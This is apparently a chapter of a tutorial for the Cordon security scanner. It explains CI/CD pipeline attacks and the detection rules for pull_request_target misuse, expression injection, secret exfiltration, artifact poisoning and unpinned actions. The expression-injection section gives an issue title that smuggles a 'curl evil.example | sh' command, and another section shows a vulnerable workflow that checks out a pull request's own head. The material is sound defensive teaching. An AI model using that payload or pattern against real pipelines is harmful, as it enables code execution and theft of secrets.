# 13 · CI/CD pipeline attacks

Tutorial 07 shows how to run Cordon **in** CI. This one is about attacks **on**
CI -- seven rules for the pipeline itself, across GitHub Actions, GitLab,
Jenkins, Azure Pipelines, CircleCI, Buildkite and Travis.

```
┌──────────────────────────────────────────────────────────────────────────┐
│ Why the pipeline is the target                                           │
├──────────────────────────────────────────────────────────────────────────┤
│   Your laptop has your code. Your CI runner has your code AND            │
│   every credential needed to publish it: the registry token, the         │
│   signing key, the cloud role, the deploy webhook.                       │
│                                                                          │
│   An attacker who runs one command there does not need your              │
│   machine. They can publish a release.                                   │
└──────────────────────────────────────────────────────────────────────────┘
```

## The seven rules, by what the attacker gets

```
┌──────────────────────────────────────────────────────────────────────────┐
│   RUN AS THE REPOSITORY, FROM OUTSIDE IT                                 │
│     SUSPECT.CI.PR_TARGET.001         pull_request_target plus a          │
│                                      checkout of the PR's own head       │
│                                                                          │
│   INJECT A COMMAND INTO THE RUNNER                                       │
│     SUSPECT.CI.EXPRESSION_INJECTION.001                                  │
│                                      an event field pasted straight      │
│                                      into a shell line                   │
│                                                                          │
│   TAKE THE SECRETS OUT                                                   │
│     MALWARE.CI.SECRET_EXFIL.001      the secrets context sent to a host  │
│     SUSPECT.CI.SECRET_EGRESS.001     a secret reaches a network call     │
│                                                                          │
│   REPLACE WHAT THE BUILD PRODUCES                                        │
│     SUSPECT.CI.ARTIFACT_POISONING.001                                    │
│                                      an untrusted artefact downloaded    │
│                                      and then used                       │
│                                                                          │
│   RUN CODE NOBODY REVIEWED                                               │
│     SUSPECT.CI.FETCH_EXEC.001        a fetch piped into a shell          │
│     POLICY.CI.UNPINNED_ACTION.001    a tag, not a commit SHA             │
└──────────────────────────────────────────────────────────────────────────┘
```

## `pull_request_target` -- the one that costs the most

```
┌──────────────────────────────────────────────────────────────────────────┐
│   pull_request                     pull_request_target                   │
├──────────────────────────────────────────────────────────────────────────┤
│   runs the PR's code               runs the BASE branch's workflow       │
│   no secrets                       WITH SECRETS                          │
│   read-only token                  write token                           │
│                                                                          │
│   ...which is safe, and is why the trigger exists.                       │
│                                                                          │
│   It stops being safe the moment the workflow checks out the             │
│   pull request's own head:                                               │
│                                                                          │
│      on: pull_request_target                                             │
│      steps:                                                              │
│        - uses: actions/checkout@v4                                       │
│          with:                                                           │
│            ref: <the PR head sha expression>      ◀── here               │
│        - run: npm install && npm test                                    │
│                                                                          │
│   `npm install` runs that fork's postinstall script, on a runner         │
│   holding your publish token. Any stranger can open the PR.              │
│                                                                          │
│      SUSPECT.CI.PR_TARGET.001                                            │
└──────────────────────────────────────────────────────────────────────────┘
```

## Expression injection

```
┌──────────────────────────────────────────────────────────────────────────┐
│   GitHub expands an expression into the shell script BEFORE bash         │
│   ever sees it. It is textual substitution, not an argument.             │
│                                                                          │
│      - run: echo "Thanks <expr github.event.issue.title>"                │
│                                                                          │
│   An issue titled      a"; curl evil.example | sh; #                     │
│   becomes a command. The attacker wrote no code and touched no           │
│   file -- they typed a title.                                            │
│                                                                          │
│   The fix is an env indirection, so it arrives as data:                  │
│                                                                          │
│      - env:                                                              │
│          TITLE: <expr github.event.issue.title>                          │
│        run: echo "Thanks $TITLE"                                         │
│                                                                          │
│      SUSPECT.CI.EXPRESSION_INJECTION.001                                 │
└──────────────────────────────────────────────────────────────────────────┘
```

Cordon treats these context fields as attacker-controlled: `issue.title`,
`issue.body`, `pull_request.title`, `pull_request.body`, `comment.body`,
`review.body`, `head_ref`, `head.label`, `commit.message`, `author.name`,
`author.email`, `discussion.title`, `discussion.body`, `page_name`.

## Unpinned actions

```
┌──────────────────────────────────────────────────────────────────────────┐
│   uses: some/action@v3        a tag. The author can move it.             │
│   uses: some/action@a1b2c3d   a commit. They cannot.                     │
│                                                                          │
│   A tag is mutable, so `@v3` is a promise rather than a fact --          │
│   and it is a promise made by somebody whose account you do not          │
│   control. tj-actions/changed-files showed what happens when that        │
│   promise is broken: retagged, and every workflow using the tag          │
│   ran the new code on its next run.                                      │
│                                                                          │
│   POLICY.CI.UNPINNED_ACTION.001 is POLICY, not SUSPECT. It is            │
│   posture, so by default it is reported and does NOT fail the            │
│   build (tutorial 10, advisory_domains).                                 │
└──────────────────────────────────────────────────────────────────────────┘
```

## Run it

```bash
# CI config is found by path AND by content, so a workflow in an
# unusual directory is still read as one
cordon-scanner scan . --include '.github/**' --include '.gitlab-ci.yml'

# just this domain
cordon-scanner scan . -f json:out.json
jq '.findings[] | select(.rule_id | test("\\.CI\\.")) | .rule_id' out.json
```

## Why a CI finding is scored differently from an install hook

```
┌──────────────────────────────────────────────────────────────────────────┐
│   The SAME behaviour means opposite things in the two places:            │
│                                                                          │
│     reads a secret + calls an API                                        │
│       in an install hook ...... critical. It runs on a consumer's        │
│                                 machine, unprompted, as them.            │
│       in a CI job ............. that is the job. Reading a token         │
│                                 out of the vault and calling the         │
│                                 deploy API is what a deploy does.        │
│                                                                          │
│   Conflating the two made Elasticsearch's .buildkite scripts             │
│   produce fifteen critical findings, all of them a build doing           │
│   build things. `ci_hook_paths` is kept separate from                    │
│   `install_hook_paths` for exactly this reason.                          │
└──────────────────────────────────────────────────────────────────────────┘
```

---

Next: **[14 · Containers, Kubernetes and IaC](14-containers-and-iac.md)**.
